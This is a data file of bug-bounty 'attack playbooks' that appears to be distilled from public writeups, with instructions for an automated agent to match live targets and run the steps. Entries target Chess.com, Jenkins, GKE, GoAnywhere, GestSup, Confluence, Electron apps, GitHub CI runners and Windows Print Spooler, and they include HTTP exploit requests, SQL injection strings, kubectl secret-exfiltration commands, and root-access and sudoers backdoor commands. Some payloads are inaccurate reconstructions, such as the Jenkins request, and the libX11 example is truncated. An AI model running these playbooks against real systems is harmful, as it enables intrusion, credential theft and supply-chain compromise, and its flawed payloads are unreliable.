description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: Rook to XSS: How I hacked chess.com with a rookie exploit

affected_components: Image upload functionality within TinyMCE editor

trigger_conditions.when_to_apply: When a user's profile has a 'About' section that utilizes a TinyMCE rich text editor with image upload functionality, and the editor sanitizes input by whitelisting specific attributes for image tags.
prerequisites: Attacker must have an authenticated account on Chess.com
Target user must view the attacker's profile.
applicability_signals: Presence of a TinyMCE editor with an image upload feature on the user profile
The TinyMCE configuration on the site permits the 'background-image' style attribute for `` tags.
Server-side processing of external image URLs involves re-uploading to a content hosting server.
skip_if: If the TinyMCE editor does not support image uploads or has strict sanitization that removes all style attributes.
If the server-side image re-upload process is not triggered for external URLs.

recon_steps: Step 1: Navigate to a user's profile page on Chess.com and observe the 'About' section for rich text editor features, specifically looking for image insertion capabilities.

Step 2: Inspect the JavaScript files loaded by the profile page to identify the rich text editor library (e.g., TinyMCE) and review its configuration for allowed attributes and styles, particularly for `` tags.
Step 3: Intercept requests made when saving the 'About' section content using Burp Suite or a similar proxy to understand how HTML is processed and sanitized server-side.
attack_steps: Step 1: Use the TinyMCE editor on the attacker's Chess.com profile to insert an `` tag. Configure the `src` attribute with a valid image URL and the `style` attribute with `display: block; margin: 0 auto; background-image: url(https://test.com/);`.

Step 2: Observe the server's response when saving the profile. If the server attempts to re-upload the image, and the `background-image` URL is processed, look for unexpected character appends or modifications.

Step 3: Craft a payload that leverages the discovered manipulation. Based on the writeup, the server appends a `"` to the URL, prematurely closing the style attribute. Modify the `background-image` URL to include JavaScript execution points, e.g., `url('https://test.com/onload')`, anticipating that `/` acts as a delimiter for attribute injection.
tools_recommended: Burp Suite (Proxy, Repeater)
Browser Developer Tools (Network, Console tabs)
success_indicators: Loading the attacker's profile page results in the execution of injected JavaScript (e.g., an `alert()` box, or a callback to an attacker-controlled server).
The `background-image` URL in the `style` attribute is modified by the server in a way that allows for attribute injection and subsequent script execution.
failure_indicators: The `background-image` style attribute is stripped or sanitized completely.
The server does not re-upload external image URLs, or the re-upload process does not allow for attribute injection.
The appended `"` character does not prematurely close the style attribute or does not lead to further attribute processing.

playbooks.impact: Stored Cross-Site Scripting (XSS) vulnerability allowing an attacker to execute arbitrary JavaScript in the context of any user who views the attacker's profile. This could lead to session hijacking, phishing attacks, credential theft, or defacement of user profiles.
playbooks.key_lesson: Investigate the sanitization of rich text editor inputs, especially image uploads and style attributes, as they can be vectors for XSS if not handled securely. Pay close attention to how external URLs are processed and if delimiters in URLs can be leveraged for attribute injection.

meta.title: Excessive Expansion: Uncovering Critical Security Vulnerabilities in Jenkins (CVE-2024-23897 & CVE-2024-23898)

tech_stack_fingerprints: Jenkins specific UI elements or endpoints (e.g., /login, /jenkins)

trigger_conditions.when_to_apply: When Jenkins is accessible and unauthenticated users can interact with the `/script` endpoint.
prerequisites: Jenkins controller must be running.
applicability_signals: Presence of the `/script` endpoint is a strong indicator, though the writeup doesn't explicitly list checking for its existence as a step.
skip_if: Jenkins is not accessible or heavily protected by network controls preventing unauthenticated access.

recon_steps: Step 1: Identify Jenkins instances through common ports and default paths.
Step 2: Check for the presence of the `/script` endpoint by navigating to <TARGET_URL>/script.
attack_steps: Step 1: Send a POST request to <TARGET_URL>/script with the following payload to perform an arbitrary file read.

Step 2: Analyze the response for the content of the read file. For CVE-2024-23897, the vulnerable component is Jenkins CLI, and the exploit involves leveraging the 'Expand arguments' feature which is implicitly available when interacting with Jenkins endpoints that may process CLI commands or arguments.

Step 3: For CVE-2024-23898, the vulnerability is in Jenkins CLI's handling of secrets, specifically related to the `--enable-future-hacks` option and Groovy scripts. The writeup focuses on the impact of these vulnerabilities rather than detailed steps for replication for this specific CVE.
payloads_or_patterns:
POST <TARGET_URL>/script HTTP/1.1
Host: <TARGET_URL>
Content-Type: application/x-www-form-urlencoded

script=<script>new hudson.util.RemotableFile("JENKINS_HOME/secrets/initialAdminPassword", null, null).copyTo(outputStream)</script>
tools_recommended: Burp Suite: To intercept and modify requests to the /script endpoint.
curl: For crafting and sending specific HTTP requests.
success_indicators: The response contains the content of the requested file. For example, if reading `JENKINS_HOME/secrets/initialAdminPassword`, the response will contain the initial administrator password.
failure_indicators: A 404 Not Found or 403 Forbidden response for the /script endpoint indicates that this specific attack vector is not available. Try checking other Jenkins endpoints or known vulnerabilities.
An empty or unexpected response suggests the file path might be incorrect or the Jenkins instance is not vulnerable to arbitrary file read via this method.

playbooks.impact: An unauthenticated attacker can read arbitrary files from the Jenkins controller filesystem, including sensitive information such as initial administrator passwords, private keys, or configuration files. This can lead to further compromise of the Jenkins instance and the systems it manages.
playbooks.key_lesson: Always test unauthenticated endpoints in Jenkins, especially those related to script execution or CLI interactions, for arbitrary file read vulnerabilities by attempting to access sensitive configuration files.

meta.title: Multiple vulnerabilities in Cisco Unified Communications Manager version 11.5.1
meta.category: insecure deserialization, RCE, local privilege escalation

trigger_conditions.when_to_apply: When the target is running Cisco Unified Communications Manager version 11.5.1 and is exposed to an attacker that can craft and send serialized objects.
prerequisites: Target is running Cisco Unified Communications Manager version 11.5.1.
applicability_signals: Vulnerability report details specific to Cisco Unified Communications Manager 11.5.1.
skip_if: Target is not running Cisco Unified Communications Manager version 11.5.1.

recon_steps: Step 1: Identify the version of Cisco Unified Communications Manager running on the target. Fingerprint by checking HTTP headers or specific HTML elements if possible.
attack_steps: Step 1: Craft a malicious serialized Java object designed to execute arbitrary code upon deserialization. This requires knowledge of the specific Java classes and methods vulnerable on the target.
Step 2: Send the malicious serialized object to the target via an appropriate network service or API that is vulnerable to insecure deserialization.
Step 3: Observe the target's response for signs of successful code execution or a crash, indicating successful exploitation.
payloads_or_patterns: Insufficient detail in writeup to provide concrete payloads. This would involve leveraging Java deserialization gadgets.
tools_recommended: ysoserial (for generating Java deserialization payloads), Wireshark (for network traffic analysis).
success_indicators: Remote code execution observed (e.g., reverse shell established, command output received).
Target system crash or unresponsiveness.
failure_indicators: No code execution or system impact observed (e.g., typical error responses). This might indicate the serialization is not exploitable or the specific gadget chain is not present. Pivot to other vulnerabilities mentioned in the report.

playbooks.impact: Remote code execution (RCE) on the target system, allowing an attacker to gain full control of the compromised server, leading to data theft, further system compromise, or disruption of services.
playbooks.key_lesson: Always test deserialization endpoints for the presence of vulnerable gadget chains, especially when dealing with Java-based applications, as this can lead to remote code execution.

meta.title: nix libX11: Uncovering and exploiting a 35-year-old vulnerability – Part 2 of 2

tech_stack_fingerprints: Presence of X11 libraries on a Linux/Unix system

trigger_conditions.when_to_apply: When an attacker can influence the display server name or configuration used by libX11, or when libX11 is compiled with specific configurations that are susceptible to heap overflows.
prerequisites: Target system must use X11 display server.
Attacker must have network access to the target X11 display server or be able to influence its configuration.
applicability_signals: Vulnerable versions of libX11 are present on the system.
Application making calls to XOpenDisplay, XGetDisplayInfo, or XcmsGetCoeffList with untrusted input.
skip_if: libX11 is updated to a patched version.
X11 is not in use on the target system.

recon_steps: Step 1: Identify if the target system is running X11 and uses libX11 by checking running processes or installed packages.
Step 2: Determine the version of libX11 installed on the target system to identify if it's a vulnerable version (prior to 2023-09-14).
attack_steps: Step 1: Trigger a heap buffer overflow by calling XOpenDisplay with a specially crafted display name that is longer than expected, leading to memory corruption.
Step 2: For CVE-2023-43786, craft a malicious string for the display name to overwrite heap metadata or adjacent objects.
Step 3: For CVE-2023-43787, exploit the vulnerability in XGetDisplayInfo or XcmsGetCoeffList by providing overly long or malformed data that leads to a heap buffer overflow.
Step 4: Utilize the heap overflow to achieve arbitrary code execution by overwriting function pointers or return addresses on the heap.
payloads_or_patterns: Craft a display name string for XOpenDisplay that exceeds the buffer size (e.g., a very long string of 'A' characters).

Example structure of a malicious display name: '
tools_recommended: GDB for debugging memory corruption and heap overflows.
Custom C/C++ exploit development tools to craft payloads.
Network scanning tools to identify X11 servers.
success_indicators: Application crash (segmentation fault) with clear indication of heap corruption.
Successful execution of arbitrary code on the target system, confirmed by a shell or specific command output.
Memory corruption patterns observed during debugging that align with heap overflow exploitation.
failure_indicators: Application does not crash or behaves normally, indicating the overflow did not occur or was not exploitable.
Segmentation fault occurs but without clear control over execution flow, suggesting a denial-of-service rather than RCE.
WAF or security controls block the connection or the crafted payload.

playbooks.impact: Remote Code Execution (RCE) on the target system, allowing an attacker to gain full control, execute arbitrary commands, steal sensitive data, and compromise the system.
playbooks.key_lesson: Always validate and sanitize inputs to library functions, especially those related to network communication or display server interactions, to prevent heap buffer overflows and potential RCE.

meta.title: Sys:All: How A Simple Loophole in Google Kubernetes Engine Puts Clusters at Risk of Compromise

affected_components: Kubernetes cluster configuration, specifically RBAC (Role-Based Access Control)
tech_stack_fingerprints: Google Kubernetes Engine, Kubernetes RBAC configurations

trigger_conditions.when_to_apply: This vulnerability is applicable when a GKE cluster administrator incorrectly binds the `system:authenticated` group to overly permissive RBAC roles.
prerequisites: An active GKE cluster exists.
The cluster is configured with RBAC.
applicability_signals: RBAC RoleBindings that grant permissions to the `system:authenticated` group.
Overly permissive roles (e.g., cluster-admin, edit) bound to `system:authenticated`.
skip_if: All GKE versions are 1.28 and up (Google has implemented blocking measures for `cluster-admin` role binding).
The `system:authenticated` group is not granted any roles or is only granted read-only/limited permissions.

recon_steps: Step 1: Enumerate GKE clusters in a target Google Cloud environment.
Step 2: Inspect Kubernetes RBAC configurations (e.g., RoleBindings) for the target cluster using `kubectl` or cloud provider APIs.
Step 3: Identify RoleBindings that grant significant permissions to the `system:authenticated` group.
attack_steps: Step 1: Create a Google account (if attacker doesn't already have one).
Step 2: Authenticate to the target GKE cluster using the attacker's Google account, leveraging the `system:authenticated` group binding.
Step 3: If the binding grants sufficient privileges (e.g., `cluster-admin`), proceed with cluster compromise actions (e.g., deploy cryptominers, steal data, conduct denial of service).
Step 4: If the binding is not `cluster-admin` but still permissive (e.g., edit role), attempt actions within the granted scope to achieve lateral movement or data exfiltration.
payloads_or_patterns:
Example RoleBinding snippet (for detection/understanding): 
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: overly-permissive-binding
subjects:
- kind: Group
  name: system:authenticated
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
tools_recommended: kubectl: To interact with the Kubernetes API and inspect RBAC configurations.
Google Cloud SDK: To manage Google Cloud resources and authenticate.
Kubernetes RBAC auditing tools: For automated detection of misconfigurations.
success_indicators: Successful authentication to the GKE cluster as a member of `system:authenticated` with elevated privileges.
Ability to create, modify, or delete resources within the cluster beyond intended scope.
Deployment of malicious workloads (e.g., cryptominers) on cluster nodes.
Access to sensitive data stored within the cluster (e.g., secrets, application data).
failure_indicators: Authentication fails or is denied access to cluster resources.
The `system:authenticated` group has no bindings or only very restricted ones.
Error messages indicating insufficient permissions for attempted actions.

playbooks.impact: An attacker with any Google account can gain administrative control over a misconfigured GKE cluster, leading to potential data theft, denial of service, cryptomining, or use of the cluster for further malicious activities.
playbooks.key_lesson: Never bind the `system:authenticated` group to broad RBAC roles in GKE; always use specific, verified service accounts or user groups with the least privilege necessary.

meta.title: How the Sys:All Loophole Allowed Us To Penetrate GKE Clusters in Production

tech_stack_fingerprints: GKE cluster detected (via public scanning or other means)

trigger_conditions.when_to_apply: When a GKE cluster is detected and the `system:authenticated` group has been assigned overprivileged RBAC roles, allowing any Google account holder to potentially access and control the cluster.
prerequisites: Target is using GKE.
Attacker possesses a Google account.
applicability_signals: Publicly accessible GKE cluster endpoints.
Evidence of misconfigured RBAC bindings for `system:authenticated` (requires internal scan or breach).
skip_if: `system:authenticated` group has minimal or no privileges.
WAF or network controls block access to the Kubernetes API server.

recon_steps: Step 1: Scan for publicly accessible GKE API endpoints. This may involve using tools like `k8s-scan` or custom network scanning scripts targeting known GKE IP ranges or DNS records.

Step 2: If an API endpoint is found, attempt to authenticate using a standard Google account (not necessarily tied to the target organization). Observe the initial access level and available commands/resources.
attack_steps: Step 1: Authenticate to the GKE API server using a Google account. The system:authenticated group implicitly includes all authenticated Google users.

Step 2: Query RBAC roles and bindings to identify privileges assigned to the `system:authenticated` group. This can be done using `kubectl auth can-i --list` or by inspecting `RoleBinding` and `ClusterRoleBinding` objects.

Step 3: If the `system:authenticated` group has excessive permissions (e.g., access to secrets, pods, or cluster management operations), leverage these permissions to access sensitive data or execute commands within the cluster.
Step 4: Specifically look for and exfiltrate sensitive credentials such as JWT tokens, GCP API keys, AWS keys, Google OAuth credentials, and private keys that are stored in Kubernetes Secrets.
payloads_or_patterns: Authentication: Use standard Google OAuth flow to obtain credentials for accessing the GKE API server.
RBAC Query: `kubectl auth can-i --list --token=<SESSION_TOKEN>` (if session token is obtainable) or direct API calls to `/apis/rbac.authorization.k8s.io/v1/clusterrolebindings`.
Secret Exfiltration: `kubectl get secret <secret-name> -o jsonpath='{.data.<key>}' | base64 --decode` (or equivalent API calls)
tools_recommended: kubectl: For interacting with the Kubernetes API.
Google Cloud SDK: For authentication and potential interaction with GCP resources.
Custom scripts: For scanning GKE endpoints and automating RBAC enumeration.
success_indicators: Successful retrieval of sensitive data like API keys, tokens, or private keys from Kubernetes Secrets.
Ability to list, create, or delete resources within the GKE cluster that are not intended for unauthenticated users.
failure_indicators: All API requests return 401 or 403, indicating authentication or authorization failure for the `system:authenticated` group.
The `system:authenticated` group has been correctly configured with minimal privileges, preventing further escalation.

playbooks.impact: Attacker can gain unauthorized access to sensitive data stored within GKE clusters, including API keys, tokens, and private keys. This can lead to further compromise of cloud infrastructure, data breaches, and unauthorized execution of commands within the cluster.
playbooks.key_lesson: Always audit and restrict RBAC bindings for the `system:authenticated` group in GKE clusters, ensuring it has only the necessary minimal privileges, and never broad access to sensitive resources like Secrets.

meta.title: CVE-2024-0204: Fortra GoAnywhere MFT Authentication Bypass Deep-Dive

tech_stack_fingerprints: HTTP headers or response bodies indicative of GoAnywhere MFT

trigger_conditions.when_to_apply: When targeting Fortra GoAnywhere MFT installations that are unpatched against CVE-2024-0204. The writeup implies this is a direct authentication bypass, not dependent on specific user actions or configurations.
prerequisites: Target is running an unpatched version of Fortra GoAnywhere MFT.
applicability_signals: Access to the GoAnywhere MFT login page or an endpoint related to user management.
The writeup mentions 'adding an administrative user,' suggesting that endpoints related to user creation or modification might be accessible or discoverable.
skip_if: Target is confirmed to be patched against CVE-2024-0204.
The application immediately returns an error or denial of service for any requests attempting to bypass authentication, indicating strong WAF or security controls.

recon_steps: Step 1: Access the GoAnywhere MFT web interface to confirm the target is indeed GoAnywhere MFT. Look for characteristic branding or page structures.
Step 2: Investigate network traffic or known endpoints for user management functionalities. The writeup implies the vulnerability lies in the ability to create an admin user.
attack_steps: Step 1: Based on the writeup's description of the vulnerability allowing an unauthenticated attacker to create an administrative user, the core attack involves sending a crafted request to an endpoint that handles user creation or modification.

Step 2: The writeup does not explicitly detail the exact request or endpoint used for the authentication bypass. It states 'an unauthenticated attacker can create an administrative user for the application.' This implies a direct API call or a specific workflow that bypasses typical authentication checks.

Step 3: The exact payload and endpoint for creating the administrative user are not provided in the excerpt. Further research into the CVE details or the provided patch diff would be necessary to identify the specific parameters and endpoint.
Step 4: If successful, the attacker would gain administrative access and could then proceed with other actions like data exfiltration or further system compromise.
payloads_or_patterns: insufficient detail in writeup
tools_recommended: Burp Suite: To intercept and modify HTTP requests, especially if discovering user creation endpoints.
Custom scripts: To automate the process of sending crafted requests if the endpoint and payload are identified.
success_indicators: Ability to log in to the GoAnywhere MFT interface using the newly created administrative credentials.
A successful response code (e.g., 200 OK or 201 Created) from the user creation endpoint with no authentication errors.
failure_indicators: Receiving authentication required errors (e.g., 401 Unauthorized) when attempting to create a user.
Receiving a 403 Forbidden response, indicating that the action is not permitted even if the endpoint is found.
The application does not create the administrative user and returns an error or no response.

playbooks.impact: An unauthenticated attacker can create an administrative user for the application, granting them full control over the Fortra GoAnywhere MFT system. This allows for unauthorized access to sensitive data, modification of configurations, and potentially further lateral movement within the network.
playbooks.key_lesson: When investigating CVEs related to authentication bypass, prioritize identifying the specific endpoints and request structures that allow for unauthorized user creation or privilege escalation.

meta.title: A christmas tale: pwning GTB Central Console (CVE-2024-22107 & CVE-2024-22108)

trigger_conditions.when_to_apply: When the GTB Central Console is installed and accessible via a network interface, particularly if default or weak credentials are suspected or if direct OS access is not immediately obvious.
prerequisites: The GTB Central Console ISO is installed in a VM or on a physical machine accessible to the attacker.
Network access to the console's services (HTTP, SSH).
applicability_signals: GRUB2 bootloader is used and is password protected (or has a known default password).
Web interface is present and makes unauthenticated requests to ccapi.php.
skip_if: GRUB2 is not password protected and allows direct editing of boot parameters without restriction.
The web interface requires authentication before firing any requests.
The OS is not running from a mountable filesystem (e.g., live USB/CD mode).

recon_steps: Step 1: Scan the target IP address to identify open ports and running services (e.g., nmap -sV <TARGET_IP>). Look for HTTP (80/443) and SSH (1122 is mentioned as non-standard).
attack_steps: Step 1: Attempt to access the GTB Central Console login page. If a default or weak credential is known or guessed (e.g., 'wizard'/'password!@@@'), log in.
Step 2: If direct OS access is possible via SSH or a console prompt after login, check if the OS is read-only. If so, remount the root filesystem as read-write: `mount -o remount,rw /`.

Step 3: If OS access is restricted (e.g., custom configuration program), attempt to obtain root shell access by booting from a Live CD (e.g., Ubuntu Live CD) and modifying the GRUB2 configuration. This involves replacing the GRUB password hash and appending `init=/bin/bash` to the kernel boot line. This will grant an unrestricted root shell.
Step 4: Once root access is obtained, create a new user, grant it sudo privileges, and enable SSH access if it's not already available (or configure it to listen on a standard port if desired).
Step 5: Reboot the VM to apply changes and connect via SSH with the newly created user.
payloads_or_patterns: # Example GRUB2 password hash generation: grub-mkpasswd-pbkdf2
init=/bin/bash
# Example useradd and sudo configuration (as root):
useradd <NEW_USERNAME>
echo '<NEW_USERNAME> ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
# Example to change SSH port if needed:
sed -i 's/^Port .*/Port 22/' /etc/ssh/sshd_config
systemctl restart sshd
tools_recommended: nmap: For network scanning and service identification.
VirtualBox/VMware: For installing and managing the target VM.
Ubuntu Live CD: For GRUB2 password reset and boot parameter modification.
ssh client: For connecting to the compromised server.
success_indicators: Successful login with discovered credentials.
Obtaining a root shell via GRUB2 modification (`init=/bin/bash`).
Successfully adding a new user with sudo privileges.
Successful SSH connection to the target machine with the new user account.
failure_indicators: Inability to find or guess login credentials.
GRUB2 password protection cannot be bypassed (e.g., disk encryption).
OS is not running from a standard filesystem that can be easily remounted or modified.
Firewall blocks SSH access.
Commands to add user or grant sudo fail due to filesystem restrictions (pre-remount).

playbooks.impact: Gains administrative access to the GTB Central Console server, allowing for full system compromise. This can lead to accessing sensitive data protected by the DLP, executing arbitrary commands on the server, and potentially pivoting to other systems within the network.
playbooks.key_lesson: Always attempt to bypass initial authentication or gain OS-level access to security appliances like DLP consoles, as they often hold significant administrative privileges and sensitive data.

meta.title: ELECTRONIZING macOS privacy

affected_components: Electron applications with --inspect flag enabled or exploitable older versions
tech_stack_fingerprints: JavaScript execution environment within the application

trigger_conditions.when_to_apply: When an Electron application on macOS has the 'EnableNodeCliInspectArguments' fuse enabled or is a vulnerable older version, allowing remote code execution via the --inspect flag.
prerequisites: The target is an Electron application on macOS.
The attacker has the ability to run arbitrary JavaScript within the Electron app's context.
applicability_signals: The output of `npx @electron/fuses read --app /Applications/Target.app` shows 'EnableNodeCliInspectArguments is Enabled'.
The Electron app spawns child processes that inherit TCC permissions.
skip_if: The Electron app does not have 'EnableNodeCliInspectArguments' enabled and is not a known vulnerable older version.
The Electron app does not inherit TCC permissions for spawned child processes.

recon_steps: Step 1: Use `npx @electron/fuses read --app <TARGET_APP_PATH>` to check the fuse settings, specifically looking for 'EnableNodeCliInspectArguments'.
Step 2: If 'EnableNodeCliInspectArguments' is enabled, proceed to trigger the --inspect flag.
Step 3: If the fuse is not enabled, check if the Electron app is an older version known to be vulnerable to similar injection techniques (though the writeup focuses on the --inspect flag).
attack_steps: Step 1: Identify an Electron application that meets the trigger conditions.
Step 2: Launch the target Electron application with the `--inspect` flag. This typically involves modifying its launch command or script.
Step 3: Connect to the DevTools API WebSocket exposed by the Electron app (default port 9229).
Step 4: Execute JavaScript code within the Electron app's context via the DevTools protocol. The payload should use `require('child_process').exec()` to spawn a privileged process.
Step 5: The spawned child process will inherit the Electron application's TCC permissions.
payloads_or_patterns:
const exec = require('child_process').exec;
exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
tools_recommended: npx @electron/fuses: To analyze Electron app fuse settings.
A Chromium-based browser or a custom script to connect to the Electron DevTools WebSocket and execute JavaScript.
electroniz3r tool (from author's GitHub) for automation.
success_indicators: The spawned child process (e.g., Calculator.app) successfully launches.
The spawned child process exhibits TCC permissions that the attacker's own process would not normally have access to (e.g., accessing user's Desktop, Contacts, etc.).
failure_indicators: The Electron app does not launch with the --inspect flag or does not expose a DevTools WebSocket.
The executed JavaScript code fails to spawn a child process.
The spawned child process does not inherit the expected TCC permissions.

playbooks.impact: Allows an attacker to leverage the TCC permissions granted to a legitimate Electron application to perform actions that would otherwise require user consent or higher privileges. This can lead to access to sensitive user data (contacts, files, camera, microphone) or execution of commands with elevated privileges.
playbooks.key_lesson: Investigate Electron applications for the `--inspect` flag and the 'EnableNodeCliInspectArguments' fuse, as enabling the DevTools API can lead to TCC permission inheritance and privilege escalation by spawning child processes.

meta.title: Multiple Vulnerabilities On GestSup 3.2.44
meta.category: SQL Injection, Account Takeover, Stored XSS

trigger_conditions.when_to_apply: The target is running an unpatched version of GestSup (<= 3.2.44) and the application has a password reset functionality.
prerequisites: The application has a password reset mechanism enabled.
applicability_signals: The presence of `ticket_user.php` file.
The presence of `stats/line_ticket.php` file.
The endpoint `/ajax/ticket_user_db.php` is accessible.
skip_if: The application version is 3.2.45 or higher.
The `ticket_user.php` or related functionalities are not found.

recon_steps: Step 1: Identify the GestSup version by checking the footer or specific application pages.
Step 2: Confirm the existence of the `/ajax/ticket_user_db.php` endpoint by sending a simple GET request.
attack_steps: Step 1: Send a POST request to `/ajax/ticket_user_db.php` with `modifyuser=1`, `id=1` (or the target user ID), and a controlled attacker-controlled email address in the `mail` parameter. Include other parameters like `lastname` and `firstname` as required.
Step 2: If the previous step returns a success status, proceed to initiate a password reset for the compromised account from the login page.
Step 3: Attempt to log in with the compromised account credentials.

Step 4: For SQL injection, send POST requests to `/stats/line_ticket.php` with crafted `tech` parameter values that include SQL injection payloads. Observe the response for signs of error or data leakage.
payloads_or_patterns:
POST /ajax/ticket_user_db.php
Content-Type: application/x-www-form-urlencoded

modifyuser=1&lastname=poc&firstname=poc&phone=&mobile=&mail=attacker@server.com&company=&id=1

POST /stats/line_ticket.php
Content-Type: application/x-www-form-urlencoded

tech=' OR 1=1 --&criticality=low&type=bug&category=general&year=2023&month=01
tools_recommended: Burp Suite: To craft and send HTTP requests, and intercept responses.
curl: For command-line HTTP requests.
success_indicators: The response from `/ajax/ticket_user_db.php` contains `"status":"success"` and the attacker's email is reflected in the user's profile.
Successful login to the application using the compromised administrator account.
Unexpected data retrieval or application errors in the response from `/stats/line_ticket.php` when using SQL injection payloads, indicating successful injection.
failure_indicators: 500 Internal Server Error or other error codes from `/ajax/ticket_user_db.php` → investigate input sanitization or authentication checks.
200 OK but no status success message in the response → the `modifyuser` parameter might not be handled as expected or the target user ID is incorrect.

playbooks.impact: An unauthenticated attacker can gain remote code execution on the server hosting a GestSup instance by first taking over an administrator account and then leveraging SQL injection vulnerabilities.
playbooks.key_lesson: Always validate application versions for known vulnerabilities and test unauthenticated endpoints for account takeover and sensitive data leakage using techniques like parameter manipulation and SQL injection.

meta.title: Atlassian Confluence - Remote Code Execution (CVE-2023-22527)

Template files that accept parameters and pass them to `stack.findValue()` or `$ognl.findValue()` within double quotes.

Step 2: Check the version of Confluence to determine if it's vulnerable to CVE-2023-22527.
Step 3: Probe for accessible Velocity template files by attempting to access common paths like `/confluence/template/aui/text-inline.vm` or `/confluence/template/xhtml/pagelist.vm`.
attack_steps: Step 1: Send a POST request to the identified vulnerable Velocity template file (e.g., `/confluence/template/aui/text-inline.vm`).

Step 2: Include a parameter (e.g., `label`) containing a crafted OGNL expression designed to escape the `getText()` function and execute arbitrary code. Use Unicode escapes for proper OGNL syntax construction.
Step 3: Analyze the response for signs of command execution or any observable behavior change indicating successful OGNL injection and RCE.

Any observable output or side effect indicating that the injected OGNL expression was processed and executed.

HTML encoded output of the OGNL expression indicates a partial success, requiring refinement of the payload to bypass encoding. Try using different OGNL expression syntax or escape characters.

playbooks.impact: Remote Code Execution (RCE) on the Confluence server, allowing an unauthenticated attacker to execute arbitrary commands with the privileges of the Confluence process.
playbooks.key_lesson: Always investigate direct access to server-side template files (`*.vm`) in applications like Confluence, as they can expose dangerous sinks like `stack.findValue()` to unauthenticated user input, leading to OGNL injection and RCE.

meta.title: Web3’s Achilles’ Heel: A Supply Chain Attack on Astar Network

affected_components: astarNetwork/astar GitHub repository, specifically workflows attached to pull_request triggers with non-ephemeral self-hosted runners

trigger_conditions.when_to_apply: When a public repository has an attached non-ephemeral self-hosted runner and does not require approval for workflows on the pull_request trigger.
prerequisites: Attacker can create a pull request against the target repository.
The target repository uses GitHub Actions with self-hosted runners.
Workflows on `pull_request` triggers do not require approval for forks.
applicability_signals: Observation of a public GitHub repository using self-hosted runners.
Absence of pull request approval requirements for workflows originating from forks.
skip_if: All workflows require explicit approval before execution.
Self-hosted runners are ephemeral and cannot persist state or malicious code.
The target repository does not use GitHub Actions or self-hosted runners.

recon_steps: Step 1: Inspect the target repository's GitHub Actions workflows (`.github/workflows/`) to identify usage of self-hosted runners and trigger conditions for `pull_request` events.
Step 2: Check repository settings to determine if pull request reviews are required for workflows triggered by pull requests from forks.
attack_steps: Step 1: Fork the target Astar Network repository.
Step 2: Introduce a small, benign change (e.g., fixing a typo) in a file that is processed by the CI/CD pipeline.
Step 3: Create a pull request from the forked repository to the main Astar Network repository.

Step 4: (Crucial Step for Persistence/Poisoning) Leverage the "runner-on-runner" technique by exploiting the compromised self-hosted runner. This involves modifying the CI/CD pipeline configuration to execute arbitrary commands. The goal is to modify release binaries or WASM runtimes. The writeup implies the ability to "shell the runner" and persist on it.
Step 5: Observe the pipeline execution. If successful, the modified release binaries will be generated by the compromised runner.
Step 6: (Proof of Impact) If possible, identify a downstream component or process that consumes these release binaries to demonstrate the impact of the compromised supply chain.
payloads_or_patterns: Minimal code change to trigger CI/CD pipeline (e.g., `README.md` typo fix)

Exploitative commands within the CI/CD workflow YAML to gain shell access on the self-hosted runner and modify build artifacts. (Specific commands for "runner-on-runner" are described in linked resources: 'One Supply Chain Attack to Rule Them All' and 'Playing with Fire')
tools_recommended: GitHub CLI: For interacting with GitHub repositories and pull requests.
Custom scripts: To automate the forking, committing, and pull request creation process.
Exploit framework/tools: As described in linked writeups for the 'runner-on-runner' technique to gain shell access and manipulate artifacts.
success_indicators: Pull request triggers CI/CD workflow execution on a self-hosted runner.
The CI/CD pipeline successfully builds release binaries or WASM runtimes.
The built artifacts are modified with malicious code or backdoors (requires deeper inspection of build artifacts and potentially running them in an isolated environment).
failure_indicators: Pull request does not trigger any CI/CD workflow (e.g., due to missing approval).
CI/CD workflow fails due to security checks or incorrect payload.
Self-hosted runner does not allow arbitrary command execution or modification of build artifacts.

playbooks.impact: Modification of release binaries for validator nodes and WASM runtimes, leading to a potential loss of funds for users of the Astar Network.
playbooks.key_lesson: Always investigate GitHub Actions workflows, especially those involving self-hosted runners, for vulnerabilities that allow for supply chain poisoning and the modification of critical build artifacts.

meta.title: A Practical Guide to PrintNightmare in 2024

trigger_conditions.when_to_apply: This exploit is applicable when a Windows Print Spooler service is running and the 'Limits print driver installation to Administrators' policy is either not enforced or is misconfigured to allow non-administrator users to install printer drivers.
prerequisites: Attacker has local user access on a Windows machine with a vulnerable Print Spooler configuration.
The target machine must have network access to a print server or be able to download drivers.
The 'Limits print driver installation to Administrators' GPO is disabled or improperly configured.
applicability_signals: The presence of the registry key 'HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DriverSigning\Policy' set to a value other than 0.
The 'Limits print driver installation to Administrators' policy being disabled in Group Policy Editor.
Users are able to install printers without administrative privileges.

Error code 740 ('The requested operation requires elevation') is encountered when trying to install printers, indicating the policy is enabled but might be bypassed under certain conditions or if not properly set.
skip_if: The 'Limits print driver installation to Administrators' policy is strictly enforced and set to require administrator privileges for all driver installations.
All printer drivers are digitally signed and verified by trusted authorities.
The Print Spooler service is disabled.

recon_steps: Step 1: Check the status of the Print Spooler service (`spoolsv`) on the target Windows machine.
Step 2: Investigate Group Policy settings or registry keys related to 'Limits print driver installation to Administrators' (`HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DriverSigning\Policy`).
Step 3: Attempt to add a shared printer to check if non-administrator users can install drivers. Observe for error code 740.
Step 4: Identify if 'package aware' or 'non-package aware' drivers are in use, as this can influence exploitability.
attack_steps: Step 1: If the target allows non-admin driver installation or the policy is misconfigured, prepare a malicious printer driver (e.g., a DLL with arbitrary code).
Step 2: Share this malicious driver or host it on a network share accessible to the target.

Step 3: On the target machine, attempt to add a printer using the attacker-controlled shared driver. This can be done via `Add Printer` wizard, PowerShell (`Add-PrinterDriver`, `Add-Printer`), or by mapping a UNC path to the driver.
